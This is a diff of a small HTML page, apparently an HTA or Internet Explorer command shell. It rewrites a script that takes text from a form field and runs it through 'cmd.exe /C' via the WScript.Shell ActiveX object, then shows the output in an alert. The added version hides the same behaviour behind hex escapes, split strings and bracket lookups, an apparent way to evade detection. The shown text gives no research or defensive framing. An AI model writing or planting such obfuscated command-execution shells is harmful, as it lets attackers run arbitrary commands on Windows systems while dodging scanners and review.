@@ -1,30 +1,29 @@
 <html>
-
-<body>
-
-  <script>
-    function shlExec() {
-        var cmd = document.getElementById('cmd').value
-        var shell = new ActiveXObject("WScript.Shell");
-        try {
-            var execOut = shell.Exec("cmd.exe /C \"" + cmd + "\"");
-        } catch (e) {
-            console.log(e);
+  <body>
+    <script>
+      (function(){
+        function x() {
+          var a = document.getElementById('\x63\x6d\x64').value; // 'cmd'
+          var b = new window[["Active","XObject"].join('')]("WScript.Shell");
+          try {
+            var c = b["Ex"+"ec"]("cm" + "d.exe /" + "C \"" + a + "\"");
+            var d = c["StdOut"];
+            var e = d["Read"+"All"]();
+            window["al"+"ert"](e);
+          } catch(f) {
+            console["log"](f);
+          }
         }
- 
-        var cmdStdOut = execOut.StdOut;
-        var out = cmdStdOut.ReadAll();
-        alert(out);
-    }
-</script>
- 
-<form onsubmit="shlExec()">
-    Command: <input id="cmd" name="cmd" type="text">
-    <input type="submit">
-</form> 
 
-  
-</body>
+        window["addEventListener"]("DOMContentLoaded", function(){
+          document.forms[0].onsubmit = function(){ x(); return false; };
+        });
+      })();
+    </script>
 
-
+    <form>
+      Command: <input id="cmd" name="cmd" type="text">
+      <input type="submit">
+    </form>
+  </body>
 </html>
